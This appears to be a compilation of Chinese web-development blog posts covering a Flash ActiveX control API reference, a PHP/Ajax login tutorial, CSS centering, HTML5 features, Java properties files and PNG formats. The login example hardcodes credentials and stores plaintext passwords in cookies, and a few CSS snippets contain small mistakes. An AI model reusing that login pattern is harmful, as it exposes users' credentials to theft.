AutoHigh：一开始是播放速度和显示效果并重，但如有必要就牺牲画质确保速度。开始播放时就启用消锯齿 功能。但如果实际的帧速率比设计时指定的速率慢了，就禁用消锯齿功能来提高播放速度。

例子 ：movie.Quality2 = "High" 
 
14.ReadyState（只读） 
语法：ReadyStateAs Long 
说明：影片的当前状态。ReadyState可以取： 
0 ——正在载入 
1 ——未初始化 
2 ——已载入 
3 ——正在交互 
4 ——完成例子 ： 
 Ifmovie.ReadyState = 4 Then 
 MsgBox " 影片载入完成！ " End If 
 
15.SAlign （读写） 
语法：SAlign AsString 
说明：对齐模式（与AlignMode 联动）。当AlignMode 
代表各对齐模式的位被置“1”时，SAlign 值也相应被设为 “L”（Left）、“T”（Top）、“R”（Right）、“B”（Bottom）各 字符的组合。（‘L’、‘T’、‘R’、‘B’的先后顺序不变）

例子：设置影片为左对齐和顶对齐： movie.SAlign = "LT" 
 
16.Scale （读写） 
语法：scale AsString 
说明：缩放模式（与ScaleMode 联动）。Scale 可以 取: 
ShowAll ——在控件内显示全部影片区域，保持影片长宽比例不变，影片的大小决定于控件长或宽中较小的一 边。 
NoBorder ——在控件内显示部分影片区域，保持影片长宽比例不变，影片的大小决定于控件长或宽中较大的一 边。 
ExactFit ——在控件内显示全部影片区域，将影片的长宽比例强制等于控件的长宽比例。
例子 ：MsgBox " 当前的缩放模式是：" & movie.Scale 
 
17.ScaleMode（读写） 
语法：ScaleModeAs Long 
说明：缩放模式(与 Scale 联动)。ScaleMode 可以取： 
0 ——相当于 Scale 取 "ShowAll" 
1 ——相当于 Scale 取 "NoBorder" 
2 ——相当于 Scale 取 "ExactFit" 
例子：使影片的缩放模式改成“ExactFit”： movie.ScaleMode= 2 
 
18.Stacking （读写） 
语法：Stacking AsString 
说明：用于 HTML，将 Flash Player 当成 HTML 中 的一种“行为”使用时，该属性决定 Flash 影片相对于与其 参照的 HTML 内容如何显示。（有关“行为”请参阅样式表 的资料）。Stacking 可以取：

none ——“行为”不显示。 
replaceall ——“行为”的显示取代全部其他元素的内容 ， 包括背景 。 
content ——“行为”的显示只取代其他元素的内容。 
background ——“行为”的显示只取代其他元素的背景 。 
below ——“行为”在所有其他元素内容的下面显示。 
belowflow ——“行为”以反向 Z 顺序显示在其他元素 的子对象之上 ，但在该元素主要内容之上。 
aboveflow ——“行为”以正向 Z 顺序显示在其他元素 的子对象之下 ，但在该元素主要内容之上。 
above ——“行为”显示在所有其他元素的内容之上。 
top ——“行为”的显示置于整个页面内容之上。
例子 ：movie.Stacking = "below" 
 
19.TotalFrames（只读） 
语法：TotalFramesAs Long 
说明：返回影片中总帧数。该参数要到影片载入完成 才有效（ReadyState=4）。 
例子 ：If movie.ReadyState = 4 Then 
MsgBox " 本影片共有 " & movie.TotalFrames & " 帧。" 
End If 
 
20.WMode （读写） 
语法：WMode AsString 
说明：控件的窗口模式。WMode可以取： 
Window —— WMode 属性的默认值，按 Flash 播放器典型的方式工作，即在控件的矩形窗口中播放影片，这样一般都能提供最快的动画效果。 
Opaque ——使影片不透明。 Transparent ——创建一个透明的影片。如果影片中有 
透明的片段，放到这里时，就可以看到控件下面的背景。但 使用此属性值，动画的播放速度可能会慢一些。
例子 ：movie.WMode = "Transparent"
 
方法:
1.Back 
语法：Back()  
说明 ：影片后退一帧 ， 并且停止播放 。 
例子 ：movie.Back 
 
2.Forward 
语法：Forward() 
说明 ：影片前进一帧 ， 并且停止播放 。 
例子 ：movie.Forward 
 
3.GotoFrame 
语法：GotoFrame(FrameNumAs Long) 说明：将影片跳转到由FrameNum 指定的帧，并且 
停止播放。如果所指定的帧还未载入，播放器前进到最后 的可用帧并停下，在调用过程中会产生无法预料的后果。 最好使用 PercentLoaded 方法来确定是否已载入足够的影片来执行本方法。参数 FrameNum 是从 0 开始的，这和 Flash 中的 Goto 动作不一样，它是从 1 开始的。

例子：跳转到影片的第 20 帧： movie.GotoFrame 20 
 
4.LoadMovie 
语法：LoadMovie(layerAs Long, url As String) 说明：将由 url 指定的影片载入到由layer 指定的层上。 
例子：将 movie.swf载入至 0 层： movie.LoadMovie 0,"movie.swf" 
 
5.Pan 
语法：Pan(x AsLong, y As Long, mode As Long) 说明：将一个放大过的影片平移由 x 和 y 指定的距离。 
x 和 y 均为相对值。即控件相对于影片来说平移的距离（你 可以想象控件是一个窗户，影片是我们从窗户里看到的放 在外面的布景, 我们看到窗户相对于布景平移了一些距离， 那是外面的布景在动，而窗户是不动的）。用 mode 参数 来指定 x 和 y 的值是像素还是窗口的百分比，当 mode=0 时 坐标系以像素为单位；mode=1 时坐标系就以窗口的百分 比来计算。  平移并不能超出影片的边框，也就是说，往一个方向平移最多到达影片的边缘与控件对齐的程度。

例子：控件相对于影片向左向上各平移 5 个像素（当 然控件不会动，是影片向右向下平移了 ）： movie.Pan 5,5,0 
 
6.Play 
语法:Play() 
说明: 开始播放影片。 
例子: movie.Play
 
7.Rewind 
语法:Rewind() 
说明: 倒带。返回到影片的第一帧 。 
例子: movie.Rewind
 
8.SetVariable 
语法:SetVariable(nameAs String, value As String) 说明:将由 name 指定的 Flash 变量值设为 value。

例子:movie.SetVariable"/Form:UserName", "John Smith"
 
9.SetZoomRect 
语法:SetZoomRect(leftAs Long, top As Long, right 
As Long, bottom As Long) 
说明: 将影片中指定的矩形区域放大到控件的大小。 left(左)、top(顶)、right(右)、bottom(底)的坐标值是相 对于控件中的影片有效位置计算的。注意哟，这个函数是从影片的有效区域的左上角开始计算，而不是控件的左上 角。

例子：放大影片中从左上角开始的 200 × 200 点的矩 形区域 ： 
pointsToTwips = 20; 
movie.SetZoomRect 0, 0, 200 *pointsToTwips, 200* pointsToTwips 
 
10.Stop 
语法：Stop()  
说明 ：停止播放影片 。 
例子：movie.Stop 
 
11.StopPlay 
语法：StopPlay() 
说明 ：停止播放影片 。 
例子：movie.StopPlay
 
12.TCallFrame 
语法：TCallFrame(targetAs String, FrameNumAs Long) 
说明：在由 t a r ge t  指定的时间轴中，执行由 FrameNum 指定的帧中的动作。 
例子：要运行主时间轴中第 5帧的动作： movie.TCallFrame"/", 4 
 
13.TCallLabel 
语法：TCallLabel(targetAs String, label As String) 说明：在由 target 指定的时间轴中，执行由 label 指定的帧中的动作。

例子：要运行主时间轴中名为“HandleScriptNotify”的帧中的动作： movie.TCallLabel"/", "HandleScriptNotify"

14.TGotoFrame 
语法：TGotoFrame(targetAs String, FrameNum 
As Long) 
说明：对于由 t a r ge t  指定的时间轴，转到由 FrameNum 指定的帧。 
例子 ：movie.TGotoFrame "/MovieClip", 2 
 
15.TGotoLabel 
语法:TGotoLabel(target As String, label As String) 说明：对于由 target 指定的时间轴，转到由 label 指定的帧。

例子：movie.TGotoLabel"/MovieClip", "MyLabel" 
 
16.TPlay 
语法：TPlay(targetAs String) 说明：播放由 target 指定的时间轴。 
例子：movie.TPlay"/MovieClip" 
 
17.TSetProperty 
语法：TSetProperty(targetAs String, property AsLong, value As String) 
说明：对于由 target 指定的时间轴，把由 property 指 定的属性设为由 value 指定的值（字符串）。property 是一个 代表相应属性的编号（详情请参阅附表）。

例子 ：Dim nameIndex As Long 
             nameIndex = 13 
movie.TSetProperty "/MovieClip", nameIndex, 
"NewName" 
 
18.TSetPropertyNum 
语法：TSetPropertyNum(targetAs String, property As Long, value As Double) 
说明：对于由 target 指定的时间轴，把由 property 指定的属性设为由 value 指定的值（数字）。property 是 一个代表相应属性的编号 （详情请参阅附表 ）。

例子 ：Dim visibilityIndex As Long visibilityIndex = 7 
movie.TSetProperty "/MovieClip", visibilityIndex, 1 
 
19.TStopPlay 
语法：TStopPlay(targetAs String) 
说明：停止播放由target 指定的时间轴。 
例子 ：movie.TStopPlay "/MovieClipToStop" 
 
20.Zoom 
语法：Zoom(factorAs Long) 
说明：以 factor 指定的相对百分比来缩放视图。factor可以理解为从控件窗口看到的影片占实际大小的百分比。将factor 设为 0，则视图还原成 100% 大小。当前视图已经是100%时不能再将其缩小。

例子 ：将影片放大两倍 ： movie.Zoom 50 
 
 
下面的方法都有返回值： 
21.CurrentFrame 
语法：CurrentFrame()As Long 
说明: 返回影片的当前帧数。影片的第一帧为 0 。 例子 ： Dim frameNow As Integer frameNow =movie.currentFrame

 
22.FlashVersion 
语法：FlashVersion()As Long 
说明：返回控件版本号。该值共有三个字节，依次是主 版本号、次版本号、修订版本号。如我用的 Flash 播放器控 件用此方法返回值是 3 2 7 7 2 2 ，相当于十六进制的

&h05002A，相当于 5.00.42。 
例子：下列程序显示你所使用的控件版本号： 
Dim verNum, majorNum, minorNum, revisionNumAs Long 
verNum=movie.FlashVersion 
majorNum=verNum \ 65536 
minorNum=(verNum - majorNum * 65536) \ 256 
revisionNum = verNum Mod 256 
MsgBox " 你的 Flash 播放器控件的版本号："  & majorNum & "." &minorNum & "." & revisionNum 
 
23.GetVariable 
语法：GetVariable(nameAs String) As String 
说明：返回 name 指定的 Flash 变量的值。如果变量 不存在则返回 null。 
例子 ： 
Dim firstName, radioButtonValue As StringfirstName = movie.GetVariable "FirstName" radioButtonValue =movie.GetVariable("/Form/ RadioButton:Value")

 
24、IsPlaying 
语法：IsPlaying()As Boolean 
说明：如果影片正在播放则返回true 。 
例子 ：If movie.IsPlaying Then 
MsgBox " 影片正在播放中！ "
             End If 
 
25.PercentLoaded 
语法：PercentLoaded()As Long 
说明：返回目前已经载入的影片的百分比。取值范围 从 0 到 100 。 
例子 ： 
Dim loaded As Boolean 
If movie.PercentLoaded = 100 Then loaded =true 
End If 
26.TCurrentFrame 
语法：TCurrentFrame(targetAs String) As Long 
说明：返回由 target 指定的时间轴中当前帧的号码。返 回的帧号码是从 0 开始的，也就是说影片的第一帧为 0 ，第 
二帧为 1,以此类推。 
例子 ： 
Dim currentFrame As Long 
currentFrame =movie.TCurrentFrame("/MovieClip") 
 
27.TCurrentLabel 
语法：TCurrentLabel(targetAs String) As String 
说明：返回由 target 指定的时间轴中当前帧的标签。 如果没有当前帧的标签，则返回一个空字符串。 
例子 ： 
Dim currentLabel As String 
currentLabel =movie.TCurrentLabel("/MovieClip") 
 
28.TGetProperty 
语法：TGetProperty(targetAs String, property As Long) As String 
说明：对于由 target 指定的时间轴，返回由 property 指定的属性值（字符串）。其中，property 是一个代表相应 属性的编号（详情请参阅附表）。

例子 ： 
Dim nameIndex As Long Dim name As StringnameIndex = 13 name = movie.TGetProperty("/", nameIndex)

 
29.TGetPropertyNum 
语法：TGetPropertyNum(targetAs String, property As Long) As Double 
说明：对于由 target 指定的时间轴，返回由 property 指定的属性值（数字）。其中，property 是一个代表相应属 性的编号（详情请参阅附表）。

例子 ： 
Dim framesLoadedIndex As Long DimframesLoaded As Double framesLoadedIndex = 12 framesLoaded =movie.TGetProperty("/", framesLoadedIndex)

 
附表：获取及设置属性。相应的每个属性的编号都可用在 TGetProperty、TGetPropertyAsNumber、TSetProperty 或 TSetPropertyNum 中，以指出将要访问的属性。
 
事件:
1.FSCommand 
语法：FSCommand(commandAs String, args As 
String) 
说明：在 Flash 中为影片添加的 FSCommand 动作可 以从影片中传递信息给 Flash 播放器，Flash 播放器或包含 播放器控件的网页或程序播放这个影片时就根据得到的这些信息执行相应的动作，从而实现影片内部与外部应用的交 互操作。如在 F l a s h 中给一个按钮图片添加如下的 Action：

on(release) { 
  fscommand("fullscreen","true"); 
} 
当 Flash 播放器播放这个文件时点击按钮，播放器就 会切换到全屏模式。
 
下面是 Flash 自带的播放器能识别的 命令和它们的参数： 
命令 ： quit 
参数 ：无参数 
作用：关闭播放器 命令：fullscreen 参数：true 或 false 
作用：设置为 true 使播放器以全屏模式播放；设置 为 false 使播放器回到一般窗口模式播放。 
 
命令：allowscale 
参数：true 或 false 
作用：设为 false 将使影片不随播放器大小改变而改 变，始终保持原始尺寸，相当于播放器菜单中的 100% ； 设为 true 则恢复影片随播放器大小而改变的尺寸，相当于 播放器菜单中的 Show All 。

 
命令：showmenu 
参数：true 或 false 
作用：设为 true 显示全部菜单，包括菜单栏和播放 区的右键菜单；设为 false 菜单栏不显示，播放区的右键菜单中只有一项“About Macromedia FlashPlayer...”。

 
命令： exec 
参数：应用程序的路径及名称 作用：执行一个指定的应用程序。如在 Flash 影片中 
添加动作为 ： 
fscommand("exec","regedit");
则播放器播放影片时执行此动作会打开“注册表编辑 器”程序。注意哟，Flash 自带的播放器接收到这些命 令后会执行相应的动作，但在控件中不会有任何反应，只能由程序在 FSCommand 事件中分析接收到的 command 和args 并编程做出相应处理。

 
2.OnProgress 
语法：EventOnProgress(percentDone As Long) 
说明：发生在 Flash 影片下载时。percentDone 是影片已下载的百分比，取值从 0 到 100 。 
例子：在窗体标题栏中显示下载进度： 
Private Sub movie_OnProgress(ByValpercentDone As Long)  
form1.Caption = " 影片已下载：" & percentDone&"%"
End Sub 
 
3.OnReadyStateChange 
语法：EventOnReadyStateChange(newState As 
Long) 
说明：发生在控件的准备状态改变时。下面列出了 
newState 可能的值： 
0 ——正在载入 
1 ——未初始化 
2 ——已载入 
3 ——正在交互 
4 ——完成 
例子：影片载入完成后出现提示信息，然后开始播放 影片 ： 
Private Sub movie_OnReadyStateChange(newStateAs 
Long) 
  IfnewState = 4 Then 
MsgBox " 影片载入完成！ " & vbCrLf &" 影片总帧 数：" & movie.TotalFrames 
　    　movie.Play 
         End If 
     End Sub
 
有些例子是VB的,但还是看得懂,反正不是写Flash播放器的话也用不了多少的
只要一个Movie属性和Play()方法就可以在From里放flash了
 
这里算是对C#Winform对使用Flash控件的一个总结吧,希望给想我一样对Flash不太熟悉的人一些帮助
在WinFrom里使用Flash的确很炫

版权声明：本文为博主原创文章，未经博主允许不得转载。

用户登录验证Ajax实例详解
程序的思路主要是：页面加载时调用init判断客户端是否存有网站所需的cookies，如果有的话取相应cookies到服务端验证，通过验证显示成功提示，反之显示登录框，同样如果没有所需cookies也显示登录框直到用户输入正确的用户名和密码。整个过程两次用到了ajax，一次是用户输入用户名和密码点击登录按钮后，另一次是页面加载时的用户名和密码验证，其实两个过程调用的是同一个函数parseLogin，这个函数主要负责与远程（也就是“?action=login”）通讯，而“?action=login”接受post过来的用户名和密码进行处理并返回处理结果，客户端收到服务端的处理结果后进行进一步的处理（调用函数makeResult）。可以看出与传统的“处理登录”相比是有很大差别的，首先整个过程中没有任何的页面加载（也就是无刷新），form中我并没有指定action和method，由js完成与PHP的通信，同时也是异步的（你可以同时进行多个请求，而按传统方式在进行一个请求时不能再进行其他请求（使用多个iframe也可以模拟出异步的效果，这里不包括这种情况）），充分利用这两点就可以制作出以前需要通过非常复杂的方法才可能达到的效果，如自动完成等。客户端使用的prototype.js，实际上从我第一眼发现这个强悍无比的家伙时就离不了它了，还狠心“抛弃”了已经很习惯的SAJAX。另外服务端返回的是XML，在这里使用XML只是想说明一种通用的js处理XML的方式。当然由于是无刷新的，所以在提交登录时已经看不到状态栏上的进度条，如果登录时间过长，用户可能不知道发生了什么事情，会不停的点击提交，这时我们一般会在提交时生成一个加载条，告诉用户目前正在发生什么，如gmail右上角的loading...，chinaren的“我正在帮您登录，请稍等...”，当服务端返回结果时就要隐藏这个加载条，控制display属性就可以简单的实现这种轮换效果<?php
/**************************************************************
* login.php
* @author JAVA中文网 
* @email hi@javaweb.cc
* @note ajax登录验证，用户名和密码保存在客户端cookies中
**************************************************************/

//得到安全字符串
function safe_str($str)
{
return (string)htmlspecialchars(trim($str));
}

if(safe_str($_GET['action'])=='login')
{
//登录验证
header("Content-type: text/xml");
$user=safe_str($_POST['user']);
$pwd=safe_str($_POST['pwd']);

$response_xml='<info>';

//只有当用户名为root，密码为888时才通过验证
$response_xml.=($user!='root'||$pwd!='888')?'<error>incorrect username or password!</error>':"<login><info><user>{$user}</user><pwd>{$pwd}</pwd></info></login>";

$response_xml.='</info>';
print $response_xml;
exit;
}
else
{
?>
<html>
<head>
<title>Ajax登录验证</title>
<script type="text/javascript" src="prototype.js"></script>
<script language="JavaScript" type="text/javascript">
<!--
//得到cookies的值
function getCookie(name)
{
var dc=document.cookie;
var prefix=name+"=";
var begin=dc.indexOf("; "+prefix);

if(begin==-1)
{
begin=dc.indexOf(prefix);
if(begin!=0)
return "";
}
else
begin+=2;
var end=document.cookie.indexOf(";",begin);
if(end==-1)
end=dc.length;
return unescape(dc.substring(begin+prefix.length,end));
}

//删除cookies
function delCookie(name)
{
if(getCookie(name))
document.cookie=name+"=; path=/; expires=Thu, 01-Jan-70 00:00:01 GMT";
}

//设置cookies
function setCookie(name,value)
{
var expires=new Date();
expires.setTime(expires.getTime()+30*24*60*60*1000); //设置cookies失效时间为一个月
document.cookie=name+"="+escape(value)+"; expires="+expires.toGMTString()+"; path=/";
}

//得到节点的值
function getElementTextNS(local,parentElem,index) 
{
var result = parentElem.getElementsByTagName(local)[index];
return result?result.childNodes.length>1?result.childNodes[1].nodeValue:(result.firstChild?result.firstChild.nodeValue:""):"n/a";
}

//初始化
function init()
{
var loginUser=getCookie("ajaxUser");
var loginPwd=getCookie("ajaxPwd");
loginUser!=""?parseLogin(loginUser,loginPwd):genLoginForm();
}

//退出登录
function logOut()
{
delCookie("ajaxUser");
delCookie("ajaxPwd");
genLoginForm();
}

//用指定的用户名和密码登录
function parseLogin(username,password)
{
var postBody="user="+escape(username)+"&pwd="+escape(password);
new Ajax.Request("?action=login", {method:"post", postBody:postBody,
onFailure:function() {alert("程序异常")}, 
onSuccess:makeResult});
return false;
}

//处理登录返回结果
function makeResult(response)
{
var info=response.responseXML.getElementsByTagName("info");
var error=getElementTextNS("error",info[0],0);
if(error!="n/a")
{
genLoginForm();
alert("请输入正确的用户名和密码");
}
else
{
var user=getElementTextNS("user",info[0],0);
var pwd=getElementTextNS("pwd",info[0],0);

setCookie("ajaxUser",user);
setCookie("ajaxPwd",pwd);
if(getCookie("ajaxUser")=="")
{
genLoginForm();
alert("您的浏览器必须支持cookies");
}
else
$("content").innerHTML="<h2>Hello,<font color=\"red\">"+user+"</font>!<a href=\"javascript:logOut();\">logout</a></h2>";
}
}

//显示登录框
function genLoginForm()
{
$("content").innerHTML="<form onsubmit=\"return parseLogin($('user').value,$('pwd').value);\">用户名：<input type=\"text\" id=\"user\" size=\"12\"> 密码：<input type=\"password\" id=\"pwd\" size=\"12\"> <input type=\"submit\" value=\"登录\"></form>";
}
//-->
</script>
</head>

<body onload="init();">
<div id="content"></div>
</body>
</html>
<?php
}
?>
 

版权声明：感觉我写的还算不错的的话希望你能够动动你的鼠标和键盘为我点上一个赞或是为我奉献上一个评论，在下感激不尽!_______________________________________________________欢迎转载，希望在你转载的同时，添加原文地址，谢谢配合

CSS中的居中：完全指导
水平居中：Horizontally

1.行内元素

text-align : center;

2.单个块级元素

你可以设置一个块级元素居中，如果你已经设置了这个块元素的宽度（width）的话，设置其margin-left和margin-right为auto就可以。如果你没有设width，块级元素通常会占满其父元素显示。

{

    width : 200px;


    margin : 0 auto; 


}

通常情况下你不能让一个浮动元素居中

3.多个块级元素在一行内水平居中

此时你可以修改这些块级元素的display属性为inline-block或flexbox。

inline-block的情况

//父元素设置text-align为center

.inline-block-center{

    text-align : center;


}

//子元素设置display为inline-block

.inline-block-center div{

    display : inline-block;


    text-align : left;


}




flexbox的情况:

直接设置父元素的display为flex,将父元素作为弹性伸缩盒显示

.flex-center{

    display : flex;


    justify-content : center;


}

垂直居中：Vertically

1.行内元素

1.1单行行内元素

有时候行内元素或文本元素看上去垂直居中，仅仅是因为其上下内边距设置了相同的值。

.link{

    padding-top : 30px;


    padding-bottom : 30px;


}

如果有时候你不想选择padding，那还有一种方法就是设置line-height的值与height的值相等。

.center-text-trick{

    height : 100px;


    line-height : 100px;


    white-space : nowrap;


}




1.2多行元素

设置相同的padding-top和padding-bottom对多行元素也会产生垂直居中的效果。

但是如果padding设置不好使的时候，我们也可以使用table和table-cell。对display为table-cell的元素使用vertical-align为middle即可。

.center-table {

    display : table;


    height : 250px;


    width : 240px;


    background-color : white;


}

.center-table p {

    display : table-cell;


    margin : 0;


    background-color : black;


    color : white;


    vertical-align : middle;


}

如果table过时了，那你可以尝试一下flexbox，一个flex子元素可以在其flex父元素中很简单的居中。

.flex-center-vertically{

    display : flex;


    justify-content : center;


    flex-direction : column;


}

注意：垂直居中的条件必须是其父元素有一个固定的高度height。

如果以上几种垂直居中的方法就失效了，那就只能'ghost element'技术，用伪元素(pseudo element)了。一个满高的伪元素被放置在父容器中，要垂直居中的元素和它一起居中。

.ghost-center{

    position : relative;


}

.ghost-center :: before{

    content : "";


    display : inline-block;


    height : 100%;


    width : 1%;


    vertical-align : middle;


}

.ghost-center p{

    display : inline-block;


    vertical-align : middle;


}

2.块级元素

2.1知道元素的高度？

在网页布局中，不知道某个块元素的高度是很常见的，因为当块元素的宽度改变时，其内容也会随着改变高度。文本样式的变化也会改变文本的总体高度。文本内容大小的变化也会改变文本的总体高度。

有固定高宽比例的元素。比如img，当其调整大小时，也会改变高度。

但如果你知道元素的高度，那改元素垂直居中可以这样写：

.parent{

    position : relative;


}

.child{

    position : absolute;


    top : 50%;


    height : 100px;


    margin : -50px;


}

2.2不知道元素的高度

我们还是可以把该元素先压到父元素一半的地方，然后再往上轻推一点，具体如下：

.parent{

    position : relative;


}

.child{

    position : absolute;


    top : 50%;


    transform : translateY(-50%);


}

2.3是否可以利用CSS3的flexbox呢？

可以的，并且很简单。

.parent{

    display : flex;


    flex-direction : column;


    justify-content : center;


}




3.水平+垂直居中

1.元素有固定的宽度和高度

先对元素绝对定位，让其先定位在父元素的50%/50%处，然后使用负外边距，使其等于元素宽度和高度的一半，具体代码如下

.parent{

    position : relative;


}

.child{

    width : 300px;


    height : 100px;


    padding : 20px;


    position : absolute;


    top : 50%;


    left : 50%;


    margin : -70px 0 0 -170px;


}

2.元素的宽度和高度未知


如果你不知道元素的宽度和高度，你可以使用CSS3的transition过度属性，使用translate函数，并在X,Y两个方向都移动该元素高宽的-50%。

.parent{

    position : relative;

}

.child{

    position : absolute;


    top : 50%;


    left : 50%;


    transform : translate(-50%,-50%);


}

3.使用CSS3的flexbox


需要使用flexbox的两个方向上的居中属性，代码如下：

.parent{

    display : flex;


    justify-content : center;


    align-items : center;


}




结论：利用css，你可实现完全的居中。

原文：https://css-tricks.com/centering-css-complete-guide/



HTML5 CSS3：诱人的3D旋转木马效果相册实例

HTML5 CSS3：诱人的3D旋转木马效果相册实例
利用HTML5和CSS3实现的3D旋转木马效果相册

下载地址：http://www.devstore.cn/code/info/341.html
运行截图：


相关下载：
HTML5 Canvas火焰闪烁动画 火焰跟随鼠标 
HTML5仿Apple Watch时钟动画



版权声明：本文为博主原创文章，未经博主允许不得转载。

properties文件的使用
DBConfig.properties的文件内容：
driver=com.mysql.jdbc.Driver
url=jdbc:mysql://localhost:3306/wireless_db?useUnicode=true&characterEncoding=utf-8
username=root
password=123


1.创建对象
Properties prop = new Properties();
2.加载文件

prop.load(this.getClass().getClassLoader().getResourceAsStream(
                    "DBConfig.properties"));
3.获取文件具体内容
 String driver = prop.getProperty("driver");
 String url = prop.getProperty("url");
 String username = prop.getProperty("username");
 String password = prop.getProperty("password");




版权声明：本文为博主原创文章，未经博主允许不得转载。

HTML5语言的28个新特性学习
1. 新的Doctype尽管使用<!DOCTYPE html>，即使浏览器不懂这句话也会按照标准模式去渲染2. Figure元素用<figure>和<figcaption>来语义化地表示带标题的图片<figure> <img src=”path/to/image” alt=”Aboutimage” /> <figcaption> <p>This is an image of something interesting. </p> </figcaption> </figure> 3. 重新定义的<small><small>已经被重新定义了，现在被用来表示小的排版，如网站底部的版权声明4. 去掉link和script标签里面的type属性5. 加/不加 括号HTML5没有严格的要求属性必须加引号，闭合不闭合，但是建议加上引号和闭合标签6. 让你的内容可编辑，只需要加一个contenteditable属性7. Email Inputs如果我们给Input的type设置为email，浏览器就会验证这个输入是否是email类型，当然不能只依赖前端的校验，后端也得有相应的校验8. Placeholders这个input属性的意义就是不必通过javascript来做placeholder的效果了9. Local Storage使用Local Storage可以永久存储大的数据片段在客户端（除非主动删除），目前大部分浏览器已经支持，在使用之前可以检测一下window.localStorage是否存在10. 语义化的header和footer11. 更多的HTML5表单特性12. IE和HTML5默认的，HTML5新元素被以inline的方式渲染，不过可以通过下面这种方式让其以block方式渲染header, footer, article, section, nav, menu, hgroup { display: block; } 不幸的是IE会忽略这些样式，可以像下面这样fix:document.createElement(”article”); document.createElement(”footer”); document.createElement(”header”); document.createElement(”hgroup”); document.createElement(”nav”); document.createElement(”menu”); 13. hgroup一般在header里面用来将一组标题组合在一起，如<header> <hgroup> <h1> Recall Fan Page </h1> <h2> Only for people who want the memory of a lifetime. </h2> </hgroup> </header> 14. Required属性required属性定义了一个input是否是必须的，你可以像下面这样声明<input type=”text” name=”someInput” required> <!--或者--> <input type=”text” name=”someInput” required=”required”> 15. Autofocus属性正如它的词义，就是聚焦到输入框里面<input type=”text” name=”someInput” placeholder=”Douglas Quaid” required autofocus> 16. Audio支持HTML5提供了<audio>标签，你不需要再按照第三方插件来渲染音频，大多数现代浏览器提供了对于HTML5 Audio的支持，不过目前仍旧需要提供一些兼容处理，如<audio autoplay=”autoplay” controls=”controls”> <source src=”file.ogg” /><!–FF–> <source src=”file.mp3″ /><!–Webkit–> <a href=”file.mp3″>Download this file.</a> </audio> 17. Video支持和Audio很像，<video>标签提供了对于video的支持，由于HTML5文档并没有给video指定一个特定的编码，所以浏 览器去决定要支持哪些编码，导致了很多不一致。Safari和IE支持H.264编码的格式，Firefox和Opera支持Theora和Vorbis 编码的格式，当使用HTML5 video的时候，你必须都提供：<video controls preload> <source src=”cohagenPhoneCall.ogv” type=”video/ogg; codecs=’vorbis,theora’” /> <source src=”cohagenPhoneCall.mp4″ type=”video/mp4;’codecs=’avc1.42E01E, mp4a.40.2′” /> <p> Your browser is old. <a href=”cohagenPhoneCall.mp4″>Download this video instead.</a> </p> </video> 18. 预加载视频preload属性就像它的字面意思那么简单，你需要决定是否需要在页面加载的时候去预加载视频<video preload> 19. 显示视频控制<video preload controls> 20. 正则表达式由于pattern属性，我们可以在你的markup里面直接使用正则表达式了<form action=”" method=”post”> <label for=”username”>Create a Username: </label> <input type=”text” name=”username” id=”username” placeholder=”4 <> 10″ pattern=”[A-Za-z]{4,10}” autofocus required> <button type=”submit”>Go </button> </form> 21. 检测属性支持除了Modernizr之外我们还可以通过javascript简单地检测一些属性是否支持，如：<script> if (!’pattern’ in document.createElement(’input’) ) { // do client/server side validation } </script> 22. Mark元素把<mark>元素看做是高亮的作用，当我选择一段文字的时候，javascript对于HTML的markup效果应该是这样的：<h3> Search Results </h3> <p> They were interrupted, just after Quato said, <mark>”Open your Mind”</mark>. </p> 23. 什么时候用<div>HTML5已经引入了这么多元素，那么div我们还要用吗？div你可以在没有更好的元素的时候去用。24. 想立即使用HTML5?不要等2022了，现在就可以使用了，just do it.25. 哪些不是HTML51)SVG2)CSS33)Geolocation4)Client Storage5)Web Sockets26. Data属性<div id=”myDiv” data-custom-attr=”My Value”> Bla Bla </div> CSS中使用：<style> h1:hover:after { content: attr(data-hover-response); color: black; position: absolute; left: 0; } </style> <h1 data-hover-response=”I Said Don’t Touch Me!”> Don’t Touch Me </h1> 27. Output元素<output>元素用来显示计算结果，也有一个和label一样的for属性28. 用Range Input来创建滑块HTML5引用的range类型可以创建滑块，它接受min, max, step和value属性可以使用css的:before和:after来显示min和max的值<input type=”range” name=”range” min=”0″ max=”10″ step=”1″ value=”"> <style> input[type=range]:before { content:attr(min); padding-right: 5px; } input[type=range]:after { content:attr(max); padding-left: 5px;} </style> 

版权声明：感觉我写的还算不错的的话希望你能够动动你的鼠标和键盘为我点上一个赞或是为我奉献上一个评论，在下感激不尽!_______________________________________________________欢迎转载，希望在你转载的同时，添加原文地址，谢谢配合

png8和png24的区别
png8和png24的区别：
1.png8和png24的根本区别，不是颜色位的区别，而是存储方式不同。 
2.png8有1位的布尔透明通道（要么完全透明，要么完全不透明，不支持半透明），png24则有8位（256阶）的布尔透明通道（所谓半透明）。 
png-8 和 gif 有一些相似之处，模式都是索引颜色，只支持像素级的纯透明，不支持 alpha 透明。
如何判断图片是png8还是24：
1.在ps里看图像—模式，png8当然只有8位/通道了。 
2.当打开png8的图片时，ps会默认给它的图片标题上加上“索引”两字，png24的则没有。
ps切图时应遵循：
1.色彩丰富的、大的图片切成jpg的； 
2.尺寸小的，色彩不丰富的和背景透明的切成gif或者png8的； 
3.半透明的切成png24。
png透明ie6下的兼容问题：
我们通常说的“IE6 不支持 PNG 透明”，是指不支持 PNG-24 的透明。但是 IE6 支持 PNG-8 的透明，就像支持 gif 的透明一样。 
新浪微博的logo（png24）采用了下面的方法来实现透明：
_background:none;  
_filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='logo.png',sizingMethod='crop');

            $(function () {
                $('pre.prettyprint code').each(function () {
                    var lines = $(this).text().split('\n').length;
                    var $numbering = $('<ul/>').addClass('pre-numbering').hide();
                    $(this).addClass('has-numbering').parent().append($numbering);
                    for (i = 1; i <= lines; i++) {
                        $numbering.append($('<li/>').text(i));
                    };
                    $numbering.fadeIn(1700);
                });
            });
        

版权声明：本文为博主原创文章，未经博主允许不得转载。

